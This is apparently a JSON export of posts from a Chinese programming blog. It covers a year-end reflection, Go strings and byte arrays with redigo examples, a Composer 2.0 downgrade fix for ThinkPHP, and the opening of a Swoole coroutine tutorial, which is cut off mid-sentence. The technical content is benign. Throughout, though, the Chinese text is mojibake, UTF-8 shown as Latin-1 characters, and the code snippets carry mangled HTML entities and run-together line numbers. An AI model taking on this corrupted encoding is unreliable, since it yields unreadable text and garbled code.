ä¸ºæ•ˆç‡å¤ªä½ï¼Œæœ¬è¯¥å·¥ä½œæ—¶é—´å†…å®Œæˆçš„äº‹æƒ…ï¼Œæ²¡æœ‰å®Œæˆï¼Ÿ æ˜¯å› ä¸ºäº‹æƒ…å¤ªå¤šï¼Ÿ è¿˜æ˜¯åªæ˜¯å› ä¸ºè€æ¿æ²¡æœ‰èµ°ï¼Ÿ å½“æˆ‘åœ¨è°ˆè®ºåŠ ç­æ—¶ï¼Œæˆ‘è°ˆäº›ä»€ä¹ˆâ€”â€”ä¸åŠ æ²¡æœ‰æ„ä¹‰çš„ç­ã€‚ å…³äºå­¦ä¹ å‰æ®µæ—¶é—´å·¥ä½œä¸Šå‡ºäº†ä¸€ç‚¹äº‹æ•…â€”â€”å› ä¸ºå®ä½“æœºæ²¡æœ‰è®¾ç½®é˜²ç«å¢™å¯¼è‡´è¢«ç—…æ¯’å…¥ä¾µã€‚ é˜²ç«å¢™åœ¨æˆ‘çš„å°è±¡ä¸­å±äºé‚£ç§åº•å±‚æ¯”è¾ƒé«˜æ·±ï¼Œæ™¦æ¶©éš¾æ‡‚çš„ä¸œè¥¿ï¼Œå†åŠ ä¸ŠåŸºç¡€çŸ¥è¯†çš„åŒ®ä¹è®©æˆ‘å¯¹é˜²ç«å¢™é¢‘é¢‘æ„Ÿåˆ°ææƒ§ã€‚ å¦‚æœå¯¹æ•´ä½“æ²¡æœ‰æ¸…æ™°çš„è®¤è¯†ï¼Œåªæ˜¯ç›²ç›®çš„ç½‘ä¸ŠæœæŸ¥ç€åˆ«äººå†™å¥½çš„è§„åˆ™ï¼Œè¿æ°”å¥½ï¼Œå¯èƒ½èƒ½è§£å†³;è¿æ°”ä¸å¥½ï¼Œå¯èƒ½è¿˜ä¼šå¯¼è‡´æœåŠ¡å™¨è¿æ¥ä¸ä¸Šï¼Œåˆ«é—®æˆ‘æ˜¯æ€ä¹ˆçŸ¥é“çš„â€¦ è€Œå½“éœ€è¦é¢ä¸´æ¯”è¾ƒå¤æ‚çš„å®šåˆ¶åŒ–éœ€æ±‚æ—¶ï¼Œå°±æ›´å¯¸æ­¥éš¾è¡Œäº†ã€‚ å…³äºå­¦ä¹ ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä¸€ç›´æƒ³æé†’è‡ªå·±çš„ï¼šåŠ¡å®åŸºç¡€ï¼Œä¸è¦åšâ€œçŸ¥è¯†çš„æ¬è¿å·¥â€ã€‚ é™„ä¸€å¼ è®½åˆºå½“ä»£çš„å¼€å‘è€…çš„å›¾ ä¸çŸ¥ä½•æ—¶ï¼ŒæŠ€æœ¯åœˆè¶Šæ¥è¶Šå–œæ¬¢è´©å–ç„¦è™‘äº†ï¼Œæ¯å¤©é†’æ¥ï¼Œé¢å¯¹å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„ä¿¡æ¯ï¼š â€œå…³äº XXX çš„é‚£äº›ä½ ä¸çŸ¥é“çš„çœŸç›¸â€ â€œåè¡€æ•´ç†ï¼Œä¸‡å­—é•¿æ–‡æå®š XXXâ€ â€œå…¨ç½‘æœ€ç¡¬æ ¸è§£è¯» XXX åº•å±‚åŸç†â€ â€œæå®šè¿™é“ XXX é¢è¯•é¢˜ï¼Œå¤§å‚éšä¾¿è¿›â€ â€œå­—èŠ‚å†…éƒ¨ç–¯ä¼ çš„ä¸€ä»½ XXX å¤±ä¼ èµ„æ–™â€ â€¦ ä»ä¾§é¢ä¹Ÿåæ˜ å‡ºå›½å†…çš„è½¯ä»¶å¼€å‘è€…æ‰¿æ‹…çš„èŒä¸šå‘å±•å‹åŠ›ã€‚ å’Œå¤§éƒ¨åˆ†äººä¸€æ ·ï¼Œæˆ‘ä¹Ÿæ—¶å¸¸ä¼šç„¦è™‘ï¼Œä½†è¿˜æ˜¯è¦å¯¹æœªæ¥æŒä¹è§‚æ€åº¦ï¼Œæ¯•ç«Ÿé«˜çº§äººæ‰æ— è®ºä½•æ—¶éƒ½æ˜¯ç´§ç¼ºçš„ã€‚ äº‹å®ä¸Šï¼Œæˆ‘ä»¬ä¸å¾—ä¸æ‰¿è®¤ä¸€ä¸ªæ®‹é…·çš„äº‹å®â€”â€”å¤§éƒ¨åˆ†ä»ä¸šè€…åªæ˜¯åœ¨åšé‡å¤æ€§ã€åˆ›æ–°ä»·å€¼ä½çš„å·¥ä½œã€‚è¿™äº›å·¥ä½œåœ¨ä¸€å®šç¨‹åº¦ä¸Šä¼šé€æ¸è¢«å–ä»£ï¼Œè¿™ä¸æ„å‘³ç€è¿™äº›å·¥ä½œä¼šè¢«å–ç¼”ï¼Œè€Œæ˜¯æ›´é«˜æ•ˆçš„å®Œæˆã€‚ é€šä¿—ä¸€ç‚¹è®²å°±æ˜¯ä¸€ä¸ªé«˜æ‰‹å¯ä»¥å–ä»£N ä¸ªä½æ‰‹ã€‚ å…³äºæ€è€ƒæˆ‘ä¸€ç›´è§‰å¾—æœ‰ä¸‰ä»¶äº‹æƒ…åœ¨æˆ‘ä»¬è¿™ä¸ªæ—¶ä»£ä¸­æä¸ºé‡è¦ï¼Œä»–ä»¬åˆ†åˆ«æ˜¯ï¼š ç¼–ç¨‹ å†™ä½œ è‹±è¯­ ç¼–ç¨‹æ¯‹åº¸ç½®ç–‘ï¼ŒæŠ€æœ¯æ”¹å˜ä¸–ç•Œã€‚ å†™ä½œåœ¨è¿™ä¸ªä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œä¸ºçŸ¥è¯†ä»˜è´¹çš„è¡Œä¸ºå·²ç»é€æ¸è¢«æ¥å—ï¼Œä»˜è´¹æ¸ é“æˆä¸ºæœ‰æ•ˆçš„è¿‡æ»¤æ‰‹æ®µï¼Œä¹Ÿä¿ƒä½¿åŸåˆ›ä½œè€…è¾“å‡ºæ›´é«˜è´¨é‡çš„å†…å®¹ã€‚ å½“ç„¶å†™ä½œèƒ½åŠ›å¹¶ä¸æ˜¯ä¸€è¹´è€Œå°±ï¼Œéœ€è¦ä¸æ–­ç§¯ç´¯ã€å®è·µã€æ€»ç»“ã€‚ ä»å‡ºæ¥åï¼Œæˆ‘å°±æœ‰ä¸€ç›´åˆ»æ„ä¿æŒè¿™ä¸ªä¹ æƒ¯ï¼Œå¤§å¤šæ•°æ—¶å€™æˆ‘ä¼šé€‰æ‹©ç”¨æ–‡å­—æ¥è®°å½•ï¼ˆåšå®¢ä¹Ÿæ˜¯ä¸€ç§è®°å½•æ–¹å¼ï¼‰ï¼Œå¯èƒ½æ˜¯è§‰å¾—ç”¨æ–‡å­—è®°å½•çš„æ–¹å¼æ›´çœŸå®ä¸€äº›ï¼Œå›å¤´çœ‹åˆ°é‚£äº›å†™æ»¡åœ°æ–‡å­—ï¼Œä¼šå‘ç°ä¸çŸ¥ä¸è§‰ä¸­å·²ç»é™ªä¼´æˆ‘èµ°äº†è¿™ä¹ˆè¿œã€‚ è‹±è¯­ç¬¬ä¸‰ä»¶äº‹æ˜¯æˆ‘ä¸€ç›´æƒ³è¦åšï¼Œå´è¿˜æ²¡æœ‰å¼€å§‹åšï¼ˆæˆ–è€…è¯´æ²¡æœ‰åšæŒä¸‹å»ï¼‰ã€‚å› ä¸ºæˆ‘ä¸€ç›´è®¤åŒä¸€ä¸ªè§‚ç‚¹ï¼šå¦‚æœä½ è‹±æ–‡ä¸è¡Œï¼Œä½ åŸºæœ¬ä¸é«˜æ‰‹æ— ç¼˜äº†ã€‚ å¦‚ä½•æˆåŠŸåšå¥½ä¸€ä»¶äº‹å¦‚ä½•æˆåŠŸåšå¥½ä¸€ä»¶äº‹æƒ…ï¼Ÿç»™æˆ‘æœ€å¤§çš„æ„Ÿè§¦å°±æ˜¯ï¼Œä¸€å®šè¦å…·å¤‡ä»¥ä¸‹ä¸¤ä¸ªå› ç´ ï¼š å…´è¶£ æˆå°±æ„Ÿ å‰è€…æ˜¯å¼€å§‹çš„åŠ¨åŠ›ï¼Œåè€…æ˜¯åšæŒä¸‹å»çš„åŠ¨åŠ›ã€‚ å…³äºåˆ†äº«ä¸ºä»€ä¹ˆè¦å†™åšå®¢ï¼Ÿ ä¸€æ–¹é¢ï¼Œé˜¶æ®µæ€§åœ°å¯¹ä¸€äº›çŸ¥è¯†è¿›è¡Œæ€»ç»“ï¼Œæ–¹ä¾¿è‡ªå·±æ—¥åéœ€è¦æ—¶æŸ¥æ‰¾ã€‚ å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä¸€ç›´è§‰å¾—çŸ¥è¯†ä¸æ˜¯ç¯®å­é‡Œé¢çš„é¸¡è›‹ï¼Œä¸ä¼šå› ä¸ºä½ åˆ†äº«ç»™ä»–äººè€Œå‡å°‘ï¼Œç›¸åï¼Œä½ ä¼šæ”¶è·åˆ°æ›´å¤šå…¶ä»–çš„ä¸œè¥¿ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å¼€å§‹å†™åšå®¢çš„åˆè¡·ã€‚ æ—¶è‡³ä»Šæ—¥ï¼Œå°ç ´ç«™æˆç«‹äº†å…­ä¸ªæœˆï¼Œåˆšå¥½ä¸€ç™¾å…«åå¤©ã€‚ç´¯è®¡å‘æ–‡ä¸€ç™¾ä½™ç¯‡ï¼Œè™½ç„¶ä¸æ˜¯æ¯ç¯‡éƒ½æ˜¯åƒå­—é•¿æ–‡ï¼Œä½†æ¯ç¯‡éƒ½æ˜¯ç»è¿‡æ€è€ƒä¸€ä¸ªå­—ä¸€ä¸ªå­—ç å‡ºæ¥çš„ã€‚ å¯æ— å¥ˆæ•´ä½“è®¿å®¢å´å°‘å¾—å¯æ€œï¼Œè¿™ä¸ç¦è®©æˆ‘é™·å…¥æ²‰æ€ï¼Œæ˜¯å¦æœ‰å¿…è¦æŠŠéƒ¨åˆ†ç²¾åå†…å®¹å‘å¸ƒåˆ°å¾®ä¿¡å…¬ä¼—å·ä¸Šã€‚ ç›®å‰è¿˜æ²¡æœ‰å…¬ä¼—å·ï¼Œåˆ›å»ºä¸€ä¸ªå…¬ä¼—å·å¹¶ä¸éš¾ï¼Œéš¾çš„æ˜¯å¦‚ä½•å–ä¸€ä¸ªä¸é”™åœ°åå­—åŠç»´æŠ¤å¥½è¿™ä¸ªå…¬ä¼—å·ã€‚ è€Œå¯¹äºå–åå­—è¿™ä»¶äº‹æƒ…ï¼Œæˆ‘å‘æ¥å¹¶ä¸æ“…é•¿ï¼Œæ‰€ä»¥è¿™ä»¶äº‹æƒ…å°±ä¸€ç›´è¢«é—²ç½®äº†ã€‚ å…³äºæœªæ¥é©¬ä¸Šå°±è¦è¿æ¥æ–°çš„ä¸€å¹´äº†ï¼Œå…ä¸äº†åˆ¶å®šè®¡åˆ’ä¸ºæ–°çš„ä¸€å¹´åšå¥½å‡†å¤‡ã€‚æˆ‘è¿™ä¸ªäººä¼¼ä¹ä»æ¥éƒ½ä¸ç¼ºè®¡åˆ’ï¼Œç¼ºçš„æ˜¯å®Œæˆè®¡åˆ’çš„æ‰§è¡ŒåŠ›ã€‚ç›¸æ¯”äºè®¡åˆ’æœ¬èº«ï¼Œä¼¼ä¹æ›´åº”è¯¥å…³æ³¨å®Œæˆè®¡åˆ’çš„æ•ˆç‡ã€‚ åˆ›å»ºä¸€ä¸ªå…¬ä¼—å·ï¼Ÿ æŒæ¡ Go è¯­è¨€ åŠ¡å®è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€æ•°æ®ç»“æ„åŠè®¡ç®—æœºç½‘ç»œåŸºç¡€ è‡³å°‘å®Œæˆä¸€ç™¾é“ LeetCode é¢˜ç›® ç»§ç»­åšæŒè·‘æ­¥ æœ€åçš„æœ€åç”¨ä¸€æ®µæˆ‘æ¯”è¾ƒå–œæ¬¢çš„è¯ï¼Œä½œä¸ºç»“æŸè¯­ï¼š ä½ å¯ä»¥æŠ±æ€¨ï¼Œä½ å¯ä»¥å“­æ³£ï¼Œå¯ä½ è¦çŸ¥é“æ˜å¤©å¤ªé˜³è¿˜æ˜¯ä¸€æ ·ä¼šå‡èµ·ï¼Œä½ åªéœ€è¦çŸ¥é“è¿™ä¸ªä¸–ç•Œå¯¹è°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½ è¿‡å¾—å¾ˆç´¯ï¼Œå…¶ä»–äººä¹Ÿä¸€æ ·æ²¡æœ‰é¡ºé£é¡ºæ°´ã€‚ç´¯äº†ï¼Œå°±å»è¢«çªé‡Œå†¥æƒ³å‘å‘†; æ¸´äº†ï¼Œå°±ç©¿ä¸Šæ¯›ç»’å…”çš„æ‹–é‹å“’å“’ä¸‹æ¥¼ï¼Œä¹°ä¸€æ¯å†°é•‡æŸ æª¬èŒ¶ï¼Œæˆ–è€…å»è·¯è¾¹ç…®ä¸€ç¢—çƒ­æ°”è…¾è…¾çš„ç‰›è‚‰é¢;é—»ä¸€é—»è·¯è¾¹çš„é‡èŠï¼Œçœ‹å‡ éƒ¨å¹½é»˜æˆ–æ„Ÿäººçš„ç”µå½±;å“ªæ€•è¿™ä¸€åˆ‡åªæ˜¯ä¸ºäº†å–æ‚¦é‚£ä¸ªå¿ƒæƒ…ä¸å¥½çš„è‡ªå·±ã€‚æœ€åï¼Œå¤šå¤šåŠªåŠ›ï¼ŒåŠªåŠ›åšä¸€ä¸ªå¯çˆ±çš„äººï¼Œä¸€ä¸ªé—ªé—ªå‘å…‰çš„äººï¼Œä¸è®¨å¥½ï¼Œä¸å°†å°±ï¼Œå¯¹è¿‡å¾€çš„è‹¦éš¾æƒ…æ·±æ„é‡ï¼Œä½†ç»ä¸å›å¤´ï¼Œä½ åªéœ€è¦ä¸€è·¯å‘å‰ï¼ŒæŠ«è†æ–©æ£˜å°±å¥½ï¼Œåˆ«å¿˜äº†ï¼Œå¸¦ç€ç¬‘ï¼šï¼‰","categories":[{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"å¹´ç»ˆæ€»ç»“","slug":"å¹´ç»ˆæ€»ç»“","permalink":"https://www.0x2beace.com/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"}]},{"title":"ç†è§£ Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„","slug":"understand-strings-and-byte-arrays-in-Go","date":"2020-12-30T15:57:13.000Z","updated":"2021-01-04T10:47:06.213Z","comments":true,"path":"understand-strings-and-byte-arrays-in-Go/","link":"","permalink":"https://www.0x2beace.com/understand-strings-and-byte-arrays-in-Go/","excerpt":"æœ€è¿‘åœ¨å­¦ä¹ Go è¯­è¨€æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘åœ¨å­¦ä¹ Go è¯­è¨€æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚ ç¬¬ä¸€æ¬¡ä½¿ç”¨redisgo æ—¶ï¼Œæœ‰ç‚¹æ‡µï¼Œæ€ä¹ˆå–å‡ºæ¥çš„æ•°æ®è·Ÿæˆ‘å­˜çš„å®Œå…¨ä¸ä¸€æ ·ï¼Ÿ 123456789101112131415161718package mainimport ( &quot;fmt&quot; &quot;github.com&#x2F;gomodule&#x2F;redigo&#x2F;redis&quot;)func main() &#123; conn, _ :&#x3D; redis.Dial(&quot;tcp&quot;, &quot;127.0.0.1:6379&quot;) defer conn.Close() conn.Send(&quot;SET&quot;, &quot;hello&quot;, &quot;hello&quot;) conn.Send(&quot;GET&quot;, &quot;hello&quot;) conn.Flush() v, _ :&#x3D; conn.Receive() fmt.Println(v)&#125; æ‰“å°ç»“æœï¼š 1[104 101 108 108 111] å½“çœ‹åˆ°è¿™ä¸ªæ‰“å°ç»“æœæ—¶ï¼Œå’¦ï½æˆ‘æ˜æ˜å­˜è¿›å»çš„æ˜¯ä¸€ä¸ª helloï¼Œæ€ä¹ˆå–å‡ºæ¥å´æˆäº†ä¸€ä¸ªæ•°ç»„ï¼Ÿ è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå°±å¾—äº†è§£Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²è¿™ä¸ªæ•°æ®ç»“æ„äº†ã€‚ è®¤è¯†å­—ç¬¦ä¸²å­—ç¬¦ä¸²æ˜¯Go è¯­è¨€ä¸­æœ€å¸¸ç”¨çš„åŸºç¡€æ•°æ®ç±»å‹ä¹‹ä¸€ï¼Œè™½ç„¶å­—ç¬¦ä¸²å¾€å¾€æ˜¯è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä½†å®é™…ä¸Šå­—ç¬¦ä¸²æ˜¯ä¸€å—è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œä¹Ÿå¯ä»¥ç†è§£æˆæ˜¯ä¸€ä¸ªç”±å­—ç¬¦ç»„æˆçš„æ•°ç»„ã€‚ å­—ç¬¦ä¸²è™½ç„¶åœ¨ Go è¯­è¨€ä¸­æ˜¯åŸºæœ¬ç±»å‹ stringï¼ˆhelloï¼‰ï¼Œä½†æ˜¯å®ƒå…¶å®å°±æ˜¯å­—ç¬¦ç»„æˆçš„æ•°ç»„ï¼ˆ[104 101 108 108 111]ï¼‰ã€‚ ä½œä¸ºæ•°ç»„æ¥è¯´ï¼Œå®ƒä¼šå ç”¨ä¸€ç‰‡è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œè¿™ç‰‡è¿ç»­çš„å†…å­˜ç©ºé—´å°±å­˜å‚¨äº†ä¸€äº›å­—èŠ‚ï¼Œè¿™äº›å­—èŠ‚å…±åŒç»„æˆäº†å­—ç¬¦ä¸²ã€‚ Go è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªåªè¯»çš„å­—èŠ‚æ•°ç»„åˆ‡ç‰‡ã€‚ å°è¯•å°†æ•°ç»„åˆ‡ç‰‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼š 12345678910111213package mainimport &quot;fmt&quot;func main() &#123; &#x2F;&#x2F; æ³¨æ„è¿™é‡Œçš„æ•°æ®ç±»å‹æ˜¯ uint8ï¼Œè€Œä¸æ˜¯ intã€uint sli :&#x3D; []uint8&#123;104, 101, 108, 108, 111&#125; fmt.Println(sli) fmt.Printf(&quot;%T \\n&quot;, sli) fmt.Println(string(sli)) fmt.Printf(&quot;%T \\n&quot;, string(sli))&#125; æ‰“å°ç»“æœï¼š 1234[104 101 108 108 111][]uint8 hellostring æ¥çœ‹çœ‹helloè¿™ä¸ªå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼ï¼š ä½ å¯èƒ½ä¼šé—®ï¼š0x68ã€0x65ã€0x6cã€0x6cã€0x6fè¿™äº›ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ ä»–ä»¬æ˜¯hello è¿™ä¸ªå­—ç¬¦ä¸²çš„åˆ‡ç‰‡æ•°ç»„çš„æ¯ä¸€ä¸ªå­—ç¬¦çš„ASCIIç æ‰€å¯¹åº”çš„åå…­è¿›åˆ¶ï¼š h =&gt; 104 =&gt; 0x68 e =&gt; 101 =&gt; 0x65 l =&gt; 108 =&gt; 0x6c l =&gt; 108 =&gt; 0x6c o =&gt; 111 =&gt; 0x6f å£°æ˜å­—ç¬¦ä¸²åœ¨Go è¯­è¨€ä¸­ï¼Œæœ‰ä¸¤ç§å­—é¢é‡æ–¹å¼å¯ä»¥å£°æ˜ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä½¿ç”¨åŒå¼•å·ï¼Œå¦ä¸€ç§åˆ™æ˜¯ä½¿ç”¨åå¼•å·ï¼š 12str1 :&#x3D; &quot;this is a string&quot;str2 :&#x3D; &#96;this is another&#96; ä½¿ç”¨åŒå¼•å·å£°æ˜çš„å­—ç¬¦ä¸²å…¶å®å’Œå…¶ä»–è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²å£°æ˜æ²¡æœ‰å¤ªå¤šåŒºåˆ«ï¼Œå®ƒåªèƒ½ç”¨äºç®€å•ã€å•è¡Œçš„å­—ç¬¦ä¸²ã€‚ å¹¶ä¸”å¦‚æœå­—ç¬¦ä¸²å†…éƒ¨å‡ºç°åŒå¼•å·æ—¶éœ€è¦ä½¿ç”¨ \\ ç¬¦å·æ¥é¿å…ç¼–è¯‘å™¨è§£æé”™è¯¯ï¼Œè€Œä½¿ç”¨åå¼•å·åˆ™å¯ä»¥å¾ˆå¥½çš„æ‘†è„±è¿™ä¸€é™åˆ¶ã€‚ åœ¨é‡åˆ°éœ€è¦å†™ JSON æˆ–è€…å…¶ä»–æ•°æ®æ ¼å¼çš„åœºæ™¯ä¸‹éå¸¸æ–¹ä¾¿ï¼Œä¸‹é¢ä¸¤ä¸ª JSON å­—ç¬¦ä¸²çš„å†™æ³•éƒ½æ²¡é—®é¢˜ï¼Œä½†æ˜¾ç„¶ç¬¬äºŒç§æ–¹å¼æ›´ç®€æ´ã€è‡ªç„¶ã€ä¾¿äºé˜…è¯»ã€‚ 12str1 :&#x3D; &quot;&#123;\\&quot;page\\&quot;: 1, \\&quot;fruits\\&quot;: [\\&quot;apple\\&quot;, \\&quot;pear\\&quot;]&#125;&quot;str2 :&#x3D; &#96;&#123;&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;pear&quot;]&#125;&#96; å‚è€ƒé“¾æ¥ è°ˆ Golang ä¸­çš„å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„","categories":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://www.0x2beace.com/tags/Golang/"}]},{"title":"Composer 2.0 å‘ä¸‹ä¸å…¼å®¹å¯¼è‡´æ‰©å±•å®‰è£…å‡ºé”™","slug":"composer-2-0-backward-incompatibility-causes-extension-installation-error","date":"2020-12-17T12:40:38.000Z","updated":"2020-12-17T12:41:30.424Z","comments":true,"path":"composer-2-0-backward-incompatibility-causes-extension-installation-error/","link":"","permalink":"https://www.0x2beace.com/composer-2-0-backward-incompatibility-causes-extension-installation-error/","excerpt":"ä»Šå¤©åœ¨éƒ¨ç½²æœåŠ¡å™¨ç¯å¢ƒæ—¶ï¼Œé‡åˆ°ä¸€ä¸ªç”±Composer ç‰ˆæœ¬å‘ä¸‹ä¸å…¼å®¹è€Œå¼•å‘çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"ä»Šå¤©åœ¨éƒ¨ç½²æœåŠ¡å™¨ç¯å¢ƒæ—¶ï¼Œé‡åˆ°ä¸€ä¸ªç”±Composer ç‰ˆæœ¬å‘ä¸‹ä¸å…¼å®¹è€Œå¼•å‘çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ã€‚ é—®é¢˜æè¿°åå°Api åº”ç”¨æ˜¯ç”¨ThinkPHP6.0 çš„å¤šåº”ç”¨æ¨¡å¼å¼€å‘çš„ï¼Œèµ·åˆéƒ¨ç½²æ—¶ï¼Œæ€»æ˜¯æç¤ºæ‰¾ä¸åˆ°æ§åˆ¶å™¨ã€‚ å½“æ—¶å°±æ¯”è¾ƒéƒé—·ï¼Œæ€ä¹ˆä¼šæ‰¾ä¸åˆ°æ§åˆ¶å™¨å‘¢ï¼Ÿè¿™ä¸ªå¼‚å¸¸é€šå¸¸åªä¼šåœ¨æ²¡æœ‰å¼€å¯å¤šåº”ç”¨æ¨¡å¼æ—¶æ‰ä¼šå‡ºç°ï¼Œå¯æ˜¯æˆ‘æ˜æ˜å·²ç»å¼€å¯äº†å¤šåº”ç”¨æ¨¡å¼ï¼Œä¹Ÿå®‰è£…äº†ç›¸å…³æ‰©å±•ï¼ˆComposer 2.0.x æ‰§è¡Œ composer install æ²¡æœ‰ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼‰ã€‚ æ­£å½“æˆ‘ç™¾æ€ä¸å¾—å…¶è§£æ—¶ï¼Œä¸ç»æ„é—´çœ‹åˆ°äº†æˆ‘ç›®å‰æ‰€ä½¿ç”¨çš„ Composer ç‰ˆæœ¬æ˜¯ 2.0.xã€‚ å›å¤´å¯¹æ¯”äº†ä¸€ä¸‹æˆ‘æœ¬åœ°çš„ç‰ˆæœ¬ï¼š1.8ï¼ŒGoogle ä¸€ä¸‹æ‰å‘ç°Composer 2.0 ç³»åˆ—æ˜¯æœ€è¿‘æ‰å‘å¸ƒçš„ï¼Œäºæ˜¯é©¬ä¸Šå°±æƒ³åˆ°äº†æ˜¯å¦æ˜¯ Composer å‘ä¸‹ä¸å…¼å®¹å¯¼è‡´ã€‚ å¥½å®¶ä¼™ï¼ŒçœŸçš„æ˜¯å…¼å®¹æ€§å¯¼è‡´çš„é—®é¢˜ï¼š è§£å†³åŠæ³•æ—¢ç„¶æ˜¯ç‰ˆæœ¬è¿‡é«˜å¯¼è‡´çš„å…¼å®¹æ€§é—®é¢˜ï¼Œé‚£å°±å¥½åŠäº†ï¼Œç›´æ¥é™ä½ç‰ˆæœ¬å³å¯ã€‚ Composer é™çº§éå¸¸ç®€å•ï¼Œä¸ç”¨é‡æ–°ç¼–è¯‘å®‰è£…ï¼Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ï¼š 1composer self-update 1.8.0 å¦‚æœä½ ä¸çŸ¥é“æœ‰å“ªäº›ç‰ˆæœ¬å¯é€‰æ‹©ï¼Œå¯ä»¥æŸ¥çœ‹å®˜æ–¹çš„å‘å¸ƒå†å²ã€‚ å‚è€ƒé“¾æ¥ ThinkPHP V6.0.5ç‰ˆæœ¬å‘å¸ƒâ€”â€”å…¼å®¹Composer2.0 Composer ä¸­æ–‡æ–‡æ¡£","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Composer","slug":"Composer","permalink":"https://www.0x2beace.com/tags/Composer/"}]},{"title":"Swoole åç¨‹å¿«é€Ÿä¸Šæ‰‹","slug":"swoole-coroutine-quick-start","date":"2020-12-15T13:37:42.000Z","updated":"2020-12-15T13:38:38.874Z","comments":true,"path":"swoole-coroutine-quick-start/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-quick-start/","excerpt":"æœ€è¿‘æœ‰å¹¸è¯»åˆ° daydaygo çš„ swoole åç¨‹åˆä½“éªŒï¼Œä¸€æ–‡ä»åç¨‹çš„æ‰§è¡Œçš„è§’åº¦çª¥æ¢ Swoole çš„åç¨‹è°ƒåº¦ï¼Œå¹¶è¯¦ç»†è¯´æ˜äº†ä¸ºä»€ä¹ˆåç¨‹ä¼šå¿«ã€‚","text":"æœ€è¿‘æœ‰å¹¸è¯»åˆ° daydaygo çš„ swoole åç¨‹åˆä½“éªŒï¼Œä¸€æ–‡ä»åç¨‹çš„æ‰§è¡Œçš„è§’åº¦çª¥æ¢ Swoole çš„åç¨‹è°ƒåº¦ï¼Œå¹¶è¯¦ç»†è¯´æ˜äº†ä¸ºä»€ä¹ˆåç¨‹ä¼šå¿«ã€‚ æ–‡ç« é€šä¿—æ˜“æ‡‚ï¼Œç¬”è€…åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›è‡ªå·±çš„ç†è§£ï¼Œä»¥æ­¤æˆæ–‡ã€‚ ä¸»è¦ä»ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢æ¥äº†è§£åç¨‹ï¼š åç¨‹çš„æ‰§è¡Œé¡ºåºï¼šåç¨‹è°ƒåº¦ åç¨‹ä¸ºä»€ä¹ˆå¿«ï¼šå‡å°‘IOé˜»å¡å¸¦æ¥çš„æ€§èƒ½ä¼˜åŠ¿ åç¨‹æ‰§è¡Œé¡ºåºæŒ‰ç…§æƒ¯ä¾‹ï¼Œå…ˆæ¥çœ‹ä¸€ä¸ªæœ€ç®€å•çš„åç¨‹ä»£ç ã€‚ 12345678910&lt;?phpgo(function () &#123; echo &quot;1&quot;.PHP_EOL;&#125;);echo &quot;2&quot;.PHP_EOL;go(function () &#123; echo &quot;3&quot;.PHP_EOL;&#125;); åœ¨Swooleä¸­ Swoole\\Coroutine::create ç­‰ä»·äº go å‡½æ•°ï¼ˆSwoole\\Coroutine å‰ç¼€çš„ç±»åå¯ä»¥æ˜ å°„ä¸º Coï¼‰ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªåç¨‹ã€‚ è¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå›è°ƒå‡½æ•°çš„å†…å®¹å°±æ˜¯åç¨‹éœ€è¦æ‰§è¡Œçš„å†…å®¹ã€‚ ä¸Šé¢çš„ä»£ç æ‰§è¡Œç»“æœä¸ºï¼š 123123 ä»æ‰§è¡Œç»“æœçš„è§’åº¦æ¥çœ‹ï¼Œåç¨‹ç‰ˆçš„ä»£ç å’Œä¼ ç»Ÿçš„åŒæ­¥ä»£ç ï¼Œçœ‹èµ·æ¥å¹¶æ— å·®å¼‚ã€‚ä½†åç¨‹çš„å®é™…æ‰§è¡Œè¿‡ç¨‹å´æ˜¯ï¼š è¿è¡Œä¸Šé¢é‚£æ®µåç¨‹ä»£ç ï¼Œç”Ÿæˆä¸€ä¸ªæ–°è¿›ç¨‹ å½“ä»£ç 